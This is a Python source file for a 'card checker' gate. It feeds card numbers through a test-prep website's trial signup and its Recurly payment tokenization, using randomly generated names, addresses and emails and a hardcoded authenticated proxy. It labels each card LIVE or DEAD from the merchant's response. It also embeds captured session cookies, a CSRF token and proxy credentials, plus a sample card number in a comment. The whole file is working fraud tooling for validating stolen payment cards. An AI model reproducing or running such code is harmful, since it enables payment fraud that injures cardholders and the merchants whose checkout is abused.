
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json 
import names
import platform
import html
import ssl
import certifi
import names
import random_address
import time

async def GateMasstr(session, cc):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        timeout=18
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        genaddr = random_address.real_random_address()
        address = genaddr['address1']
        try: 
            City = genaddr['city']
        except KeyError:
            City = "FL"
        State = genaddr['state']
        Zip_Code = genaddr['postalCode']
        first = names.get_first_name().lower()
        last = names.get_last_name().lower()
        CorreoRand = f"{names.get_first_name()}{names.get_first_name()}{names.get_last_name()}{random.randint(10000,9999999)}@gmail.com".lower()
        inicio = time.time()
        try:
            try :
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                    'Accept': '*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    'X-CSRF-Token': 'FkxPmVXePEgQOIzLa3puyEnKNGxfh4vDi3wBs5y/cEOS6ItT1n5YjtObDFYwx5+Pd+w3p5FBzzlnPqCJbDZ/Vg==',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://gmat.targettestprep.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://gmat.targettestprep.com/plans',
                    'Cookie': 'smct_session=%7B%22s%22%3A1681859192987%2C%22l%22%3A1681859222898%2C%22lt%22%3A1681859222898%2C%22t%22%3A14%2C%22p%22%3A12%7D; smc_selected_subs=TrialAccess; smc_pgae_visited=gmat; _ttp_session=a443e839248d7a648e2362a874e3a10f; _ga_FRJWS0C9H5=GS1.1.1681859201.1.0.1681859201.60.0.0; _gaexp=GAX1.2.kSrr-96oTPGg0HwT913TXg.19558.1; _uetsid=ad113a10de3d11edbc9e03c2f38bd89c; _uetvid=ad114140de3d11edacf58522127d69da; _ga=GA1.2.1849130898.1681859201; _rdt_uuid=1681859205084.438758a5-5a76-4929-81e7-392d2a5b7379; _pin_unauth=dWlkPVpXWXpZMk0xT0RFdE1XSXhNUzAwWkRJMUxUZ3dZemt0TW1Rd1pXVmlZekppWW1ZeQ; smc_uid=1681859208254446; smc_tag=eyJpZCI6NDY0MCwibmFtZSI6InRhcmdldHRlc3RwcmVwLmNvbSJ9; smc_session_id=kw0gSMHl4xOqE8swbKyE4SvGYIGXCh4B; smc_refresh=25476; _gid=GA1.2.207146812.1681859210; _gat_gtag_UA_55684289_1=1; smc_tpv=1; smc_spv=1; smc_sesn=1; smc_not=default; _tt_enable_cookie=1; _ttp=aWOo9y8UkWuI2ayHre11fre2a5d; ln_or=eyIyNDg3NTA4IjoiZCJ9; _fbp=fb.1.1681859212209.46459761; _ce.s=v~323223891c52e1f5e44a612cb5c92ac225f09b0d~vpv~0~v11.rlc~1681859213851; cebs=1; _hjSessionUser_3103505=eyJpZCI6Ijk1MWQ0NTFlLWIyYWItNTZiZS05NTdjLThmZmY1NzA5YmQ2YSIsImNyZWF0ZWQiOjE2ODE4NTkyMTI1NDEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3103505=0; _hjSession_3103505=eyJpZCI6IjZlNzU3Mzc4LTJkNzAtNDQwZC1iMzk3LWI1Nzk0Y2ZmOGIyZiIsImNyZWF0ZWQiOjE2ODE4NTkyMTI1NDMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ce.clock_event=1; _ce.clock_data=-642%2C179.6.222.10%2C1; cebsp_=1; intercom-id-yyfhfwfj=eb6457fe-cfe0-4fb1-89ff-bf6efab809ff; intercom-session-yyfhfwfj=; intercom-device-id-yyfhfwfj=a3e1a1cf-30cb-4e94-a6b9-eb08f5feea6d',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                })
                data = {
                    'utf8': '✓',
                    'form_id': 'new-lead',
                    'lead[plan_code]': '5daystrial',
                    'lead[first_name]': first,
                    'lead[last_name]': last,
                    'lead[email]': CorreoRand,
                    'lead[email_confirmation]': CorreoRand,
                }
                async with session.post(f'https://gmat.targettestprep.com/leads', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=timeout) as resp:
                    response = await resp.text()
                    soup = response.replace('\\\"', '\'').replace('\\\'', '\"')
                    soup = BeautifulSoup(soup , 'lxml')
                    authenticity_token = soup.find("input", {"name": "authenticity_token"})["value"]
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}' 
            #---------------------------------REQUEST NUMERO 2------------------------------#
            #---------------------------------REQUEST NUMERO 2------------------------------#   
            try :
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                    'Accept': '*/*',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Content-type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://api.recurly.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://api.recurly.com/js/v1/field.html',
                }
                data = f'first_name={first}&last_name={last}&country=US&address1={address}&address2=&city={City}&state={State}&postal_code={Zip_Code}&token=&number={ccnum}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fgmat.targettestprep.com%2Fplans%23section-trial-sign-up&browser[screen_height]=1080&browser[screen_width]=1920&browser[time_zone_offset]=300&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A109.0%29%20Gecko%2F20100101%20Firefox%2F112.0&month={mes}&year={ano}&cvv=&version=4.22.9&key=sjc-B5oHeAkAeR81PvHzFUbFp5&deviceId=sq2AsocVW95CrjEy&sessionId=hSzDtp7lSHrT9w5x&instanceId=ANsOUxTxvP9XZfX8'

                async with session.post('https://api.recurly.com/js/v1/token', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), data=data,headers=headers, timeout=18) as resp:
                    response = await resp.json()
                    idrecurly = response['id']
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}' 
            #---------------------------------REQUEST NUMERO 3------------------------------#
            #---------------------------------REQUEST NUMERO 3------------------------------#
            try :
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                    'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    'X-CSRF-Token': authenticity_token,
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://gmat.targettestprep.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://gmat.targettestprep.com/plans',
                    # 'Cookie': 'smct_session=%7B%22s%22%3A1681859192987%2C%22l%22%3A1681859239907%2C%22lt%22%3A1681859239907%2C%22t%22%3A27%2C%22p%22%3A24%7D; smc_selected_subs=TrialAccess; smc_pgae_visited=gmat; _ttp_session=a443e839248d7a648e2362a874e3a10f; _ga_FRJWS0C9H5=GS1.1.1681859201.1.0.1681859234.27.0.0; _gaexp=GAX1.2.kSrr-96oTPGg0HwT913TXg.19558.1; _uetsid=ad113a10de3d11edbc9e03c2f38bd89c; _uetvid=ad114140de3d11edacf58522127d69da; _ga=GA1.2.1849130898.1681859201; _rdt_uuid=1681859205084.438758a5-5a76-4929-81e7-392d2a5b7379; _pin_unauth=dWlkPVpXWXpZMk0xT0RFdE1XSXhNUzAwWkRJMUxUZ3dZemt0TW1Rd1pXVmlZekppWW1ZeQ; smc_uid=1681859208254446; smc_tag=eyJpZCI6NDY0MCwibmFtZSI6InRhcmdldHRlc3RwcmVwLmNvbSJ9; smc_session_id=kw0gSMHl4xOqE8swbKyE4SvGYIGXCh4B; smc_refresh=25476; _gid=GA1.2.207146812.1681859210; _gat_gtag_UA_55684289_1=1; smc_tpv=1; smc_spv=1; smc_sesn=1; smc_not=default; _tt_enable_cookie=1; _ttp=aWOo9y8UkWuI2ayHre11fre2a5d; ln_or=eyIyNDg3NTA4IjoiZCJ9; _fbp=fb.1.1681859212209.46459761; _ce.s=v~323223891c52e1f5e44a612cb5c92ac225f09b0d~vpv~0~v11.rlc~1681859213851; cebs=1; _hjSessionUser_3103505=eyJpZCI6Ijk1MWQ0NTFlLWIyYWItNTZiZS05NTdjLThmZmY1NzA5YmQ2YSIsImNyZWF0ZWQiOjE2ODE4NTkyMTI1NDEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3103505=0; _hjSession_3103505=eyJpZCI6IjZlNzU3Mzc4LTJkNzAtNDQwZC1iMzk3LWI1Nzk0Y2ZmOGIyZiIsImNyZWF0ZWQiOjE2ODE4NTkyMTI1NDMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ce.clock_event=1; _ce.clock_data=-642%2C179.6.222.10%2C1; cebsp_=1; intercom-id-yyfhfwfj=eb6457fe-cfe0-4fb1-89ff-bf6efab809ff; intercom-session-yyfhfwfj=; intercom-device-id-yyfhfwfj=a3e1a1cf-30cb-4e94-a6b9-eb08f5feea6d',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }
                data = {
                    'utf8': '✓',
                    'authenticity_token': authenticity_token,
                    'use_new_card': 'yes',
                    'subscription[plan_code]': '5daystrial',
                    'first_name': first,
                    'last_name': last,
                    'email': CorreoRand,
                    'payment_method': 'credit_card',
                    '[]': 'US',
                    'recurly_token': idrecurly,
                    'coupon-code': '',
                    'terms': '0',
                    'emails-subscription': '0',
                }
                async with session.post(f'https://gmat.targettestprep.com/subscriptions', headers=headers, data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=timeout) as resp:
                    response = await resp.text()
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}' 
            #------------ ---------------------CHECCK REQUESTS------------------------------#
            if (int(response.find('window.location.replace')) > 0):
                return '[ LIVE ✅ ]', "Charged (1$)", f'{time.time()-inicio}'
            elif 'Your transaction was declined due to insufficient funds in your account. Please use a different card or contact your bank.' in response:
                return '[ LIVE ✅ ]', "Your transaction was declined due to insufficient funds in your account. Please use a different card or contact your bank.", f'{time.time()-inicio}' 
            elif '3DS verification failed' in response:
                return '[ ERROR ❌ ]', "3DS verification failed", f'{time.time()-inicio}'
            elif "'error', '" in response:
                response = (response.split("custom_message('error', '")[1]).split("');")[0]
                return '[ DEAD ❌ ]', response, f'{time.time()-inicio}' 
            else :
                return '[ ERROR ⚠ ]',"An unexpected error occurred in response. It was not generated correctly. ⚠️", f'{time.time()-inicio}' 
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return '[ ERROR ⚠ ]',"An unexpected error occurred. ServerDisconnectedError. ♻️", f'{time.time()-inicio}' 
        except (asyncio.exceptions.TimeoutError):
            return '[ ERROR ⚠ ]',"An unexpected error occurred. Timeout Error. ♻️", f'{time.time()-inicio}' 
        except (aiohttp.client_exceptions.ClientConnectorError):
            return '[ ERROR ⚠ ]',"An unexpected error occurred. ClientConnectorError. ♻️", f'{time.time()-inicio}' 
        finally:
                await session.close()
        

#print(asyncio.run(GateMasstr("4042635306853735|06|2024|152")))